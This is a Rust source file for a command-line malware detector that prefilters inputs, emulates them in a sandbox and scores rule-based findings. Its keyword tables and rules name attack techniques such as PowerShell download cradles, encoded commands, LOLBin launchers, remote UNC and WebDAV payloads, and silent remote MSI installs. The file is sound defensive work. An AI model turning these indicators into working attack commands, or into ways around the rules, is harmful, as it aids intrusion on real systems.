use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
use emulator_core::{
    sha256_hex, AnalysisLimits, Artifact, EventKind, HostSnapshot, Ioc, NetworkActivity,
    NetworkPolicy, TraceEvent, VirtualDirectorySnapshot, VirtualFileSnapshot,
};
use runbox_emulator::{Runbox, RunboxError, RunboxInput};
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::sync::LazyLock;
use thiserror::Error;
use url::Url;

pub const REPORT_SCHEMA_VERSION: &str = "2";
pub const MAX_DETECTOR_INPUT_BYTES: usize = 1024 * 1024;
pub const DEFAULT_SAFE_SOURCE_URLS: &[&str] = &["https://gh.io/copilot-install"];

#[derive(Debug, Clone)]
struct SafeUrlPrefix {
    scheme: String,
    host: String,
    port: Option<u16>,
    path: String,
    display: String,
}

#[derive(Debug, Clone)]
pub struct SafeSourcePolicy {
    exact: BTreeSet<String>,
    prefixes: Vec<SafeUrlPrefix>,
}

impl Default for SafeSourcePolicy {
    fn default() -> Self {
        let mut policy = Self::empty();
        for url in DEFAULT_SAFE_SOURCE_URLS {
            policy
                .add_exact_url(url)
                .expect("default safe source URL is valid");
        }
        policy
    }
}

impl SafeSourcePolicy {
    #[must_use]
    pub const fn empty() -> Self {
        Self {
            exact: BTreeSet::new(),
            prefixes: Vec::new(),
        }
    }

    /// Add one exact trusted source URL.
    ///
    /// # Errors
    ///
    /// Returns an error when the value is not an HTTP(S) URL or contains credentials.
    pub fn add_exact_url(&mut self, value: &str) -> Result<(), String> {
        self.exact.insert(normalize_safe_url(value)?);
        Ok(())
    }

    /// Add a trusted URL prefix constrained to the same scheme, host, and port.
    ///
    /// # Errors
    ///
    /// Returns an error when the value is not an HTTP(S) URL, contains credentials,
    /// or includes a query string.
    pub fn add_url_prefix(&mut self, value: &str) -> Result<(), String> {
        let url = parse_safe_url(value)?;
        if url.query().is_some() {
            return Err("safe source prefixes must not contain a query".into());
        }
        let prefix = SafeUrlPrefix {
            scheme: url.scheme().into(),
            host: url.host_str().unwrap_or_default().to_ascii_lowercase(),
            port: url.port_or_known_default(),
            path: url.path().into(),
            display: url.to_string(),
        };
        if !self
            .prefixes
            .iter()
            .any(|existing| existing.display == prefix.display)
        {
            self.prefixes.push(prefix);
        }
        Ok(())
    }

    pub fn remove_exact_url(&mut self, value: &str) -> bool {
        normalize_safe_url(value)
            .ok()
            .is_some_and(|value| self.exact.remove(&value))
    }

    pub fn remove_url_prefix(&mut self, value: &str) -> bool {
        let Ok(url) = parse_safe_url(value) else {
            return false;
        };
        let display = url.to_string();
        let previous = self.prefixes.len();
        self.prefixes.retain(|prefix| prefix.display != display);
        self.prefixes.len() != previous
    }

    #[must_use]
    pub fn is_safe(&self, value: &str) -> bool {
        let Ok(url) = parse_safe_url(value) else {
            return false;
        };
        if self.exact.contains(&url.to_string()) {
            return true;
        }
        self.prefixes.iter().any(|prefix| {
            url.scheme() == prefix.scheme
                && url
                    .host_str()
                    .is_some_and(|host| host.eq_ignore_ascii_case(&prefix.host))
                && url.port_or_known_default() == prefix.port
                && url.path().starts_with(&prefix.path)
        })
    }

    #[must_use]
    pub fn exact_urls(&self) -> Vec<&str> {
        self.exact.iter().map(String::as_str).collect()
    }

    #[must_use]
    pub fn url_prefixes(&self) -> Vec<&str> {
        self.prefixes
            .iter()
            .map(|prefix| prefix.display.as_str())
            .collect()
    }
}

fn parse_safe_url(value: &str) -> Result<Url, String> {
    let mut url = Url::parse(value).map_err(|error| format!("invalid safe source URL: {error}"))?;
    if !matches!(url.scheme(), "http" | "https") {
        return Err("safe source URLs must use HTTP or HTTPS".into());
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err("safe source URLs must not contain credentials".into());
    }
    if url.host_str().is_none() {
        return Err("safe source URLs must contain a host".into());
    }
    url.set_fragment(None);
    Ok(url)
}

fn normalize_safe_url(value: &str) -> Result<String, String> {
    Ok(parse_safe_url(value)?.to_string())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub rule_id: String,
    pub title: String,
    pub severity: Severity,
    pub score: u8,
    pub evidence: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Benign,
    Suspicious,
    Malicious,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RiskLevel {
    None,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskAssessment {
    pub score: u8,
    pub level: RiskLevel,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Confidence {
    pub score: u8,
    pub completeness: f32,
    pub unsupported_operations: usize,
    pub limits_reached: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InputSummary {
    pub kind: String,
    pub size: usize,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalysisReport {
    pub schema_version: String,
    pub analysis_mode: AnalysisMode,
    pub analysis_status: AnalysisStatus,
    pub input: InputSummary,
    pub verdict: Verdict,
    pub risk: RiskAssessment,
    pub confidence: Confidence,
    pub findings: Vec<Finding>,
    pub trace: Vec<TraceEvent>,
    pub iocs: Vec<Ioc>,
    pub artifacts: Vec<Artifact>,
    pub virtual_files: Vec<VirtualFileSnapshot>,
    pub virtual_directories: Vec<VirtualDirectorySnapshot>,
    pub network_urls: Vec<String>,
    pub network_activity: Vec<NetworkActivity>,
    pub safe_network_urls: Vec<String>,
    pub warnings: Vec<String>,
    pub steps_used: usize,
    pub prefilter: PrefilterResult,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AnalysisMode {
    HotPath,
    Thorough,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AnalysisStatus {
    PrefilterOnly,
    Emulated,
    Partial,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InputKind {
    RawCommand,
    PowerShellScript,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PrefilterSignal {
    CommandInterpreter,
    NativeLauncher,
    PowerShellSyntax,
    NetworkTool,
    NetworkLocator,
    ShellSyntax,
    ExecutableOrScript,
    EncodingOrObfuscation,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PrefilterDecision {
    DefinitelyBenign,
    Candidate,
    Oversized,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PrefilterResult {
    pub decision: PrefilterDecision,
    pub input_bytes: usize,
    pub signals: Vec<PrefilterSignal>,
}

const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
    ("powershell", PrefilterSignal::CommandInterpreter),
    ("pwsh", PrefilterSignal::CommandInterpreter),
    ("cmd.exe", PrefilterSignal::CommandInterpreter),
    ("cmd /c", PrefilterSignal::CommandInterpreter),
    ("cmd /k", PrefilterSignal::CommandInterpreter),
    ("%comspec%", PrefilterSignal::CommandInterpreter),
    ("bash", PrefilterSignal::CommandInterpreter),
    ("sh -c", PrefilterSignal::CommandInterpreter),
    ("python", PrefilterSignal::CommandInterpreter),
    ("osascript", PrefilterSignal::CommandInterpreter),
    ("mshta", PrefilterSignal::NativeLauncher),
    ("rundll32", PrefilterSignal::NativeLauncher),
    ("regsvr32", PrefilterSignal::NativeLauncher),
    ("wscript", PrefilterSignal::NativeLauncher),
    ("cscript", PrefilterSignal::NativeLauncher),
    ("msiexec", PrefilterSignal::NativeLauncher),
    ("conhost", PrefilterSignal::NativeLauncher),
    ("pcalua", PrefilterSignal::NativeLauncher),
    ("schtasks", PrefilterSignal::NativeLauncher),
    ("cmdkey", PrefilterSignal::NativeLauncher),
    ("wmic", PrefilterSignal::NativeLauncher),
    ("for /f", PrefilterSignal::NativeLauncher),
    ("forfiles", PrefilterSignal::NativeLauncher),
    ("cmstp", PrefilterSignal::NativeLauncher),
    ("msbuild", PrefilterSignal::NativeLauncher),
    ("installutil", PrefilterSignal::NativeLauncher),
    ("reg add", PrefilterSignal::NativeLauncher),
    ("reg.exe", PrefilterSignal::NativeLauncher),
    ("sc create", PrefilterSignal::NativeLauncher),
    ("sc.exe", PrefilterSignal::NativeLauncher),
    ("makecab", PrefilterSignal::NativeLauncher),
    ("extrac32", PrefilterSignal::NativeLauncher),
    ("invoke-webrequest", PrefilterSignal::PowerShellSyntax),
    ("invoke-restmethod", PrefilterSignal::PowerShellSyntax),
    ("invoke-expression", PrefilterSignal::PowerShellSyntax),
    ("iex ", PrefilterSignal::PowerShellSyntax),
    ("iex(", PrefilterSignal::PowerShellSyntax),
    ("(irm ", PrefilterSignal::PowerShellSyntax),
    ("irm(", PrefilterSignal::PowerShellSyntax),
    (" irm ", PrefilterSignal::PowerShellSyntax),
    ("(iwr ", PrefilterSignal::PowerShellSyntax),
    (" iwr ", PrefilterSignal::PowerShellSyntax),
    ("new-object", PrefilterSignal::PowerShellSyntax),
    ("frombase64string", PrefilterSignal::PowerShellSyntax),
    ("encodedcommand", PrefilterSignal::PowerShellSyntax),
    ("$env:", PrefilterSignal::PowerShellSyntax),
    ("$(", PrefilterSignal::PowerShellSyntax),
    ("[system.", PrefilterSignal::PowerShellSyntax),
    ("[text.", PrefilterSignal::PowerShellSyntax),
    ("downloadfile", PrefilterSignal::PowerShellSyntax),
    ("downloadstring", PrefilterSignal::PowerShellSyntax),
    ("start-bitstransfer", PrefilterSignal::PowerShellSyntax),
    ("start-process", PrefilterSignal::PowerShellSyntax),
    ("set-itemproperty", PrefilterSignal::PowerShellSyntax),
    ("new-itemproperty", PrefilterSignal::PowerShellSyntax),
    ("set-mppreference", PrefilterSignal::PowerShellSyntax),
    ("add-mppreference", PrefilterSignal::PowerShellSyntax),
    ("register-scheduledtask", PrefilterSignal::PowerShellSyntax),
    ("new-scheduledtask", PrefilterSignal::PowerShellSyntax),
    ("set-netfirewall", PrefilterSignal::PowerShellSyntax),
    ("add-type", PrefilterSignal::PowerShellSyntax),
    ("reflection.assembly", PrefilterSignal::PowerShellSyntax),
    ("curl", PrefilterSignal::NetworkTool),
    ("wget", PrefilterSignal::NetworkTool),
    ("bitsadmin", PrefilterSignal::NetworkTool),
    ("certutil", PrefilterSignal::NetworkTool),
    ("finger ", PrefilterSignal::NetworkTool),
    ("http://", PrefilterSignal::NetworkLocator),
    ("https://", PrefilterSignal::NetworkLocator),
    ("hxxp", PrefilterSignal::NetworkLocator),
    ("ftp://", PrefilterSignal::NetworkLocator),
    ("javascript:", PrefilterSignal::NetworkLocator),
    ("vbscript:", PrefilterSignal::NetworkLocator),
    ("\\\\", PrefilterSignal::NetworkLocator),
    ("&&", PrefilterSignal::ShellSyntax),
    ("||", PrefilterSignal::ShellSyntax),
    ("|", PrefilterSignal::ShellSyntax),
    ("^", PrefilterSignal::ShellSyntax),
    (">", PrefilterSignal::ShellSyntax),
    (".exe", PrefilterSignal::ExecutableOrScript),
    (".dll", PrefilterSignal::ExecutableOrScript),
    (".msi", PrefilterSignal::ExecutableOrScript),
    (".ps1", PrefilterSignal::ExecutableOrScript),
    (".hta", PrefilterSignal::ExecutableOrScript),
    (".vbs", PrefilterSignal::ExecutableOrScript),
    (".js", PrefilterSignal::ExecutableOrScript),
    (".sct", PrefilterSignal::ExecutableOrScript),
    (".cpl", PrefilterSignal::ExecutableOrScript),
    (".wsf", PrefilterSignal::ExecutableOrScript),
    (".jse", PrefilterSignal::ExecutableOrScript),
    (".vbe", PrefilterSignal::ExecutableOrScript),
    ("\\currentversion\\run", PrefilterSignal::ExecutableOrScript),
    ("shell:startup", PrefilterSignal::ExecutableOrScript),
    (
        "start menu\\programs\\startup",
        PrefilterSignal::ExecutableOrScript,
    ),
    ("base64", PrefilterSignal::EncodingOrObfuscation),
    ("-enc ", PrefilterSignal::EncodingOrObfuscation),
    ("charcode", PrefilterSignal::EncodingOrObfuscation),
    ("gzip", PrefilterSignal::EncodingOrObfuscation),
    ("deflatestream", PrefilterSignal::EncodingOrObfuscation),
];

static PREFILTER_MATCHER: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(PREFILTER_PATTERNS.iter().map(|(pattern, _)| *pattern))
        .expect("prefilter patterns are valid")
});

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectorInput {
    pub kind: InputKind,
    pub content: String,
}

impl DetectorInput {
    #[must_use]
    pub fn raw_command(content: impl Into<String>) -> Self {
        Self {
            kind: InputKind::RawCommand,
            content: content.into(),
        }
    }

    #[must_use]
    pub fn powershell_script(content: impl Into<String>) -> Self {
        Self {
            kind: InputKind::PowerShellScript,
            content: content.into(),
        }
    }
}

#[derive(Debug, Error)]
pub enum DetectorError {
    #[error(transparent)]
    Runbox(#[from] RunboxError),
    #[error("detector input exceeds the {MAX_DETECTOR_INPUT_BYTES} byte limit")]
    InputTooLarge,
}

#[derive(Debug, Clone)]
pub struct Detector {
    limits: AnalysisLimits,
    network_policy: NetworkPolicy,
    safe_sources: SafeSourcePolicy,
}

impl Default for Detector {
    fn default() -> Self {
        Self::new(AnalysisLimits::default())
    }
}

impl Detector {
    #[must_use]
    pub fn new(limits: AnalysisLimits) -> Self {
        Self {
            limits,
            network_policy: NetworkPolicy::default(),
            safe_sources: SafeSourcePolicy::default(),
        }
    }

    #[must_use]
    pub fn with_network_policy(mut self, policy: NetworkPolicy) -> Self {
        self.network_policy = policy;
        self
    }

    #[must_use]
    pub fn with_safe_source_policy(mut self, policy: SafeSourcePolicy) -> Self {
        self.safe_sources = policy;
        self
    }

    /// Add an exact trusted source URL.
    ///
    /// # Errors
    ///
    /// Returns an error when the URL is invalid for a safe source.
    pub fn add_safe_source_url(&mut self, url: &str) -> Result<(), String> {
        self.safe_sources.add_exact_url(url)
    }

    /// Add a trusted source URL prefix.
    ///
    /// # Errors
    ///
    /// Returns an error when the URL prefix is invalid.
    pub fn add_safe_source_prefix(&mut self, url: &str) -> Result<(), String> {
        self.safe_sources.add_url_prefix(url)
    }

    #[must_use]
    pub const fn safe_sources(&self) -> &SafeSourcePolicy {
        &self.safe_sources
    }

    #[must_use]
    pub fn prefilter(content: &str) -> PrefilterResult {
        if content.len() > MAX_DETECTOR_INPUT_BYTES {
            return PrefilterResult {
                decision: PrefilterDecision::Oversized,
                input_bytes: content.len(),
                signals: Vec::new(),
            };
        }
        if content.trim().is_empty() {
            return PrefilterResult {
                decision: PrefilterDecision::DefinitelyBenign,
                input_bytes: content.len(),
                signals: Vec::new(),
            };
        }
        let mut matched_signals = [false; 8];
        for matched in PREFILTER_MATCHER.find_iter(content) {
            let signal = PREFILTER_PATTERNS[matched.pattern().as_usize()].1;
            matched_signals[signal as usize] = true;
        }
        if contains_long_base64_token(content.as_bytes()) {
            matched_signals[PrefilterSignal::EncodingOrObfuscation as usize] = true;
        }
        if contains_powershell_call_syntax(content.as_bytes()) {
            matched_signals[PrefilterSignal::PowerShellSyntax as usize] = true;
        }
        let signals = prefilter_signals(matched_signals);
        let only_contextual = signals.iter().all(|signal| {
            matches!(
                signal,
                PrefilterSignal::NetworkLocator | PrefilterSignal::ShellSyntax
            )
        });
        let has_network = signals.contains(&PrefilterSignal::NetworkLocator);
        let has_shell = signals.contains(&PrefilterSignal::ShellSyntax);
        let decision = if signals.is_empty() || (only_contextual && !(has_network && has_shell)) {
            PrefilterDecision::DefinitelyBenign
        } else {
            PrefilterDecision::Candidate
        };
        PrefilterResult {
            decision,
            input_bytes: content.len(),
            signals,
        }
    }

    #[must_use]
    pub fn infer_input_kind(content: &str) -> InputKind {
        if Self::prefilter(content).decision == PrefilterDecision::DefinitelyBenign {
            return InputKind::RawCommand;
        }
        let lowercase = content.to_ascii_lowercase();
        if content.contains('\n')
            || content.trim_start().starts_with('$')
            || lowercase.contains("invoke-webrequest")
            || lowercase.contains("invoke-restmethod")
            || lowercase.contains("invoke-expression")
            || lowercase.contains("set-content")
            || lowercase.contains("[system.")
            || lowercase.contains("[text.")
        {
            InputKind::PowerShellScript
        } else {
            InputKind::RawCommand
        }
    }

    /// Emulate an input and produce an explainable detection report.
    ///
    /// # Errors
    ///
    /// Returns an error when the detector input exceeds its configured limit.
    pub fn analyze(&self, input: DetectorInput) -> Result<AnalysisReport, DetectorError> {
        self.analyze_with_mode(input, AnalysisMode::HotPath)
    }

    /// Analyze an input without allowing the prefilter to skip emulation.
    ///
    /// # Errors
    ///
    /// Returns an error when the detector input exceeds its configured limit.
    pub fn analyze_full(&self, input: DetectorInput) -> Result<AnalysisReport, DetectorError> {
        self.analyze_with_mode(input, AnalysisMode::Thorough)
    }

    /// Analyze an input using the selected performance mode.
    ///
    /// # Errors
    ///
    /// Returns an error when the detector input exceeds its configured limit.
    pub fn analyze_with_mode(
        &self,
        input: DetectorInput,
        mode: AnalysisMode,
    ) -> Result<AnalysisReport, DetectorError> {
        let DetectorInput { kind, content } = input;
        let prefilter = Self::prefilter(&content);
        if prefilter.decision == PrefilterDecision::Oversized {
            return Err(DetectorError::InputTooLarge);
        }
        let input_kind = input_kind_name(kind);
        if mode == AnalysisMode::HotPath
            && prefilter.decision == PrefilterDecision::DefinitelyBenign
        {
            return Ok(prefilter_benign_report(
                input_kind,
                content.len(),
                prefilter,
                mode,
            ));
        }
        let input_summary = summarize_candidate_input(input_kind, content.as_bytes());
        let mut runbox = Runbox::new(self.limits.clone());
        runbox
            .host_mut()
            .set_network_policy(self.network_policy.clone());
        let result = runbox.emulate(match kind {
            InputKind::RawCommand => RunboxInput::RawCommand(content.clone()),
            InputKind::PowerShellScript => RunboxInput::PowerShellScript(content.clone()),
        });
        let (analysis_status, snapshot) = match result {
            Ok(result) => (AnalysisStatus::Emulated, result.snapshot),
            Err(error) => {
                let mut snapshot = runbox.host().snapshot();
                let warning = format!("analysis ended early: {error}");
                if snapshot.warnings.len() < self.limits.max_warnings
                    && !snapshot.warnings.contains(&warning)
                {
                    snapshot.warnings.push(warning);
                }
                (AnalysisStatus::Partial, snapshot)
            }
        };
        let findings = evaluate_rules(&content, &snapshot, &self.safe_sources);
        let risk = assess_risk(&findings);
        let verdict = verdict_for_score(risk.score);
        let confidence = assess_confidence(&snapshot);
        let network_urls = snapshot
            .network_activity
            .iter()
            .flat_map(network_activity_urls)
            .map(str::to_owned)
            .collect::<BTreeSet<_>>()
            .into_iter()
            .collect();
        let safe_network_urls = snapshot
            .network_activity
            .iter()
            .flat_map(network_activity_urls)
            .filter(|url| self.safe_sources.is_safe(url))
            .map(str::to_owned)
            .collect::<BTreeSet<_>>()
            .into_iter()
            .collect();

        Ok(AnalysisReport {
            schema_version: REPORT_SCHEMA_VERSION.into(),
            analysis_mode: mode,
            analysis_status,
            input: input_summary,
            verdict,
            risk,
            confidence,
            findings,
            trace: snapshot.trace,
            iocs: snapshot.iocs,
            artifacts: snapshot.artifacts,
            virtual_files: snapshot.virtual_files,
            virtual_directories: snapshot.virtual_directories,
            network_urls,
            network_activity: snapshot.network_activity,
            safe_network_urls,
            warnings: snapshot.warnings,
            steps_used: snapshot.steps_used,
            prefilter,
        })
    }
}

fn network_activity_urls(activity: &NetworkActivity) -> impl Iterator<Item = &str> {
    std::iter::once(activity.url.as_str())
        .chain(activity.redirect_urls.iter().map(String::as_str))
        .chain(activity.final_url.iter().map(String::as_str))
}

fn prefilter_signals(matched: [bool; 8]) -> Vec<PrefilterSignal> {
    const SIGNALS: [PrefilterSignal; 8] = [
        PrefilterSignal::CommandInterpreter,
        PrefilterSignal::NativeLauncher,
        PrefilterSignal::PowerShellSyntax,
        PrefilterSignal::NetworkTool,
        PrefilterSignal::NetworkLocator,
        PrefilterSignal::ShellSyntax,
        PrefilterSignal::ExecutableOrScript,
        PrefilterSignal::EncodingOrObfuscation,
    ];
    SIGNALS
        .into_iter()
        .filter(|signal| matched[*signal as usize])
        .collect()
}

fn contains_powershell_call_syntax(input: &[u8]) -> bool {
    input
        .windows(2)
        .any(|window| window[0] == b'&' && matches!(window[1], b'(' | b'\'' | b'"' | b'$'))
}

fn contains_long_base64_token(input: &[u8]) -> bool {
    let mut run = 0_usize;
    for byte in input {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'_' | b'-' | b'=') {
            run += 1;
            if run >= 128 {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

const fn input_kind_name(kind: InputKind) -> &'static str {
    match kind {
        InputKind::RawCommand => "raw_command",
        InputKind::PowerShellScript => "powershell_script",
    }
}

fn prefilter_benign_report(
    kind: &str,
    size: usize,
    prefilter: PrefilterResult,
    mode: AnalysisMode,
) -> AnalysisReport {
    AnalysisReport {
        schema_version: REPORT_SCHEMA_VERSION.into(),
        analysis_mode: mode,
        analysis_status: AnalysisStatus::PrefilterOnly,
        input: InputSummary {
            kind: kind.into(),
            size,
            sha256: None,
        },
        verdict: Verdict::Benign,
        risk: RiskAssessment {
            score: 0,
            level: RiskLevel::None,
        },
        confidence: Confidence {
            score: 100,
            completeness: 0.0,
            unsupported_operations: 0,
            limits_reached: 0,
        },
        findings: Vec::new(),
        trace: Vec::new(),
        iocs: Vec::new(),
        artifacts: Vec::new(),
        virtual_files: Vec::new(),
        virtual_directories: Vec::new(),
        network_urls: Vec::new(),
        network_activity: Vec::new(),
        safe_network_urls: Vec::new(),
        warnings: Vec::new(),
        steps_used: 0,
        prefilter,
    }
}

#[must_use]
pub fn render_human(report: &AnalysisReport) -> String {
    let mut output = String::new();
    output.push_str(&format!(
        "Verdict: {:?}\nAnalysis: {:?} ({:?})\nRisk: {} / 100 ({:?})\nConfidence: {} / 100 ({:.0}% complete)\n",
        report.verdict,
        report.analysis_status,
        report.analysis_mode,
        report.risk.score,
        report.risk.level,
        report.confidence.score,
        report.confidence.completeness * 100.0
    ));
    output.push_str(&format!(
        "Findings: {}  IOCs: {}  Artifacts: {}  Virtual files: {}\n",
        report.findings.len(),
        report.iocs.len(),
        report.artifacts.len(),
        report.virtual_files.len()
    ));
    if report.prefilter.decision == PrefilterDecision::DefinitelyBenign {
        output.push_str("Prefilter: no known signals; hashing and emulation skipped\n");
    }

    if !report.findings.is_empty() {
        output.push_str("\nFindings\n");
        for finding in &report.findings {
            output.push_str(&format!(
                "- [{:?}] {} (+{}): {}\n",
                finding.severity, finding.rule_id, finding.score, finding.title
            ));
            for evidence in &finding.evidence {
                output.push_str(&format!("  evidence: {evidence}\n"));
            }
        }
    }
    if !report.iocs.is_empty() {
        output.push_str("\nIOCs\n");
        for ioc in &report.iocs {
            output.push_str(&format!(
                "- {:?}: {} ({})\n",
                ioc.kind, ioc.value, ioc.source
            ));
        }
    }
    if !report.virtual_files.is_empty() {
        output.push_str("\nVirtual files\n");
        for file in &report.virtual_files {
            output.push_str(&format!(
                "- {} ({} bytes, sha256 {})\n",
                file.path, file.size, file.sha256
            ));
        }
    }
    if !report.network_activity.is_empty() {
        output.push_str("\nNetwork activity\n");
        for activity in &report.network_activity {
            output.push_str(&format!(
                "- {:?} {} {} ({})",
                activity.outcome, activity.method, activity.url, activity.origin
            ));
            if let Some(status) = activity.status {
                output.push_str(&format!(" status={status}"));
            }
            if let Some(bytes) = activity.response_bytes {
                output.push_str(&format!(" bytes={bytes}"));
            }
            if let Some(error) = &activity.error {
                output.push_str(&format!(" error={error}"));
            }
            output.push('\n');
        }
    }
    if !report.safe_network_urls.is_empty() {
        output.push_str("\nConfigured safe network sources used\n");
        for url in &report.safe_network_urls {
            output.push_str(&format!("- {url}\n"));
        }
    }
    if report.confidence.unsupported_operations > 0 || report.confidence.limits_reached > 0 {
        output.push_str(&format!(
            "\nAnalysis gaps: {} unsupported operation(s), {} limit event(s)\n",
            report.confidence.unsupported_operations, report.confidence.limits_reached
        ));
    }
    output
}

#[allow(clippy::too_many_lines)]
fn evaluate_rules(
    input: &str,
    snapshot: &HostSnapshot,
    safe_sources: &SafeSourcePolicy,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lowercase = input.to_ascii_lowercase();
    let safe_urls = snapshot
        .network_activity
        .iter()
        .flat_map(network_activity_urls)
        .filter(|url| safe_sources.is_safe(url))
        .map(str::to_owned)
        .collect::<BTreeSet<_>>();
    let all_network_sources_safe = !snapshot.network_activity.is_empty()
        && snapshot
            .network_activity
            .iter()
            .flat_map(network_activity_urls)
            .all(|url| safe_sources.is_safe(url));
    let trusted_remote_msi = all_network_sources_safe
        && safe_source_segment_matches(input, &safe_urls, &["msiexec"], &[]);
    let trusted_remote_script_host = all_network_sources_safe
        && safe_source_segment_matches(input, &safe_urls, &["mshta", "wscript", "cscript"], &[]);
    if !safe_urls.is_empty() {
        findings.push(Finding {
            rule_id: "source.safe-network".into(),
            title: "Network activity uses a configured safe source".into(),
            severity: Severity::Info,
            score: 0,
            evidence: safe_urls.iter().cloned().collect(),
        });
    }

    add_text_rule(
        &mut findings,
        &lowercase,
        "powershell.encoded-command",
        "PowerShell encoded command",
        Severity::High,
        22,
        &["-encodedcommand", " -enc ", " -e "],
    );
    add_text_rule(
        &mut findings,
        &lowercase,
        "powershell.defense-evasion-flags",
        "PowerShell launched with hidden or policy-bypass options",
        Severity::Medium,
        5,
        &[
            "-executionpolicy bypass",
            "-ep bypass",
            "-windowstyle hidden",
            "-w hidden",
            "-noninteractive",
            "-noni",
        ],
    );
    add_text_rule(
        &mut findings,
        &lowercase,
        "launcher.lolbin",
        "Windows native launcher or execution proxy used",
        Severity::Low,
        4,
        &["mshta", "rundll32", "regsvr32", "wscript", "cscript"],
    );
    add_text_rule(
        &mut findings,
        &lowercase,
        "powershell.download-cradle",
        "PowerShell download or remote execution cradle used",
        Severity::Medium,
        5,
        &[
            "invoke-webrequest",
            "invoke-restmethod",
            "downloadfile",
            "downloadstring",
            "net.webclient",
            "net.webrequest",
        ],
    );
    add_text_rule(
        &mut findings,
        &lowercase,
        "indicator.defanged-network",
        "Published payload contains a defanged network indicator",
        Severity::Low,
        4,
        &["hxxp", "[.]", "[:]"],
    );
    let deobfuscated = lowercase.replace('^', "");
    if deobfuscated.contains("%comspec%")
        && deobfuscated.contains("for /f")
        && deobfuscated.contains("finger")
    {
        findings.push(Finding {
            rule_id: "cmd.remote-command-substitution".into(),
            title: "Obfuscated cmd loop executes commands retrieved from a remote service".into(),
            severity: Severity::Critical,
            score: 50,
            evidence: vec![
                "input combines COMSPEC, FOR /F command substitution, finger, and caret obfuscation"
                    .into(),
            ],
        });
    }
    if (lowercase.contains("rundll32") || lowercase.contains("regsvr32"))
        && lowercase.contains(r"\\")
    {
        findings.push(Finding {
            rule_id: "launcher.remote-unc".into(),
            title: "Windows launcher references a remote UNC payload".into(),
            severity: Severity::Critical,
            score: 50,
            evidence: vec!["input combines a DLL launcher with a UNC path".into()],
        });
    }
    if !trusted_remote_msi
        && lowercase.contains("msiexec")
        && (lowercase.contains("http://")
            || lowercase.contains("https://")
            || lowercase.contains(r"http:\\")
            || lowercase.contains(r"https:\\")
            || lowercase.contains("hxxp"))
    {
        findings.push(Finding {
            rule_id: "installer.remote-msi".into(),
            title: "Windows Installer references a remote package".into(),
            severity: Severity::High,
            score: 45,
            evidence: vec!["input combines msiexec with a remote package location".into()],
        });
        if contains_any(&lowercase, &[" /q", " /qn", " /quiet"]) {
            findings.push(Finding {
                rule_id: "installer.silent-remote-msi".into(),
                title: "Remote MSI installation is configured to run silently".into(),
                severity: Severity::High,
                score: 10,
                evidence: vec!["remote msiexec command includes a quiet-install option".into()],
            });
        }
    }
    if lowercase.contains("conhost")
        && lowercase.contains("--headless")
        && (lowercase.contains("cmd") || lowercase.contains("powershell"))
    {
        findings.push(Finding {
            rule_id: "launcher.headless-conhost".into(),
            title: "Headless Console Host proxies a command interpreter".into(),
            severity: Severity::High,
            score: 30,
            evidence: vec!["input combines conhost --headless with a command interpreter".into()],
        });
    }
    if !trusted_remote_script_host
        && contains_any(&lowercase, &["mshta", "wscript", "cscript"])
        && contains_any(&lowercase, &["http://", "https://", "hxxp"])
    {
        findings.push(Finding {
            rule_id: "launcher.remote-script-host".into(),
            title: "Windows script host executes content from a remote location".into(),
            severity: Severity::Critical,
            score: 45,
            evidence: vec!["input combines a Windows script host with a remote URL".into()],
        });
    }
    if lowercase.contains("davclnt")
        && lowercase.contains("davsetcookie")
        && lowercase.contains("@ssl")
    {
        findings.push(Finding {
            rule_id: "launcher.remote-webdav".into(),
            title: "Rundll32 configures a remote WebDAV resource".into(),
            severity: Severity::Critical,
            score: 50,
            evidence: vec!["input invokes davclnt.dll DavSetCookie with @SSL".into()],
        });
    }
    let downloads = [
        "curl",
        "invoke-webrequest",
        "invoke-restmethod",
        "downloadfile",
        "downloadstring",
        "net.webclient",
        "net.webrequest",
        "(irm ",
        " irm ",
        "(iwr ",
        " iwr ",
    ];
    let executions = [
        "iex",
        "invoke-expression",
        "start-process",
        "powershell -f",
        "powershell.exe -file",
        "rundll32",
        "regsvr32",
        "bash",
    ];
    let has_download = contains_any(&lowercase, &downloads);
    let has_execution = contains_any(&lowercase, &executions);
    let has_extraction = contains_any(&lowercase, &["expand-archive", "tar.exe", " tar "]);
    let trusted_download_execution = all_network_sources_safe
        && safe_source_segment_matches(input, &safe_urls, &downloads, &executions);
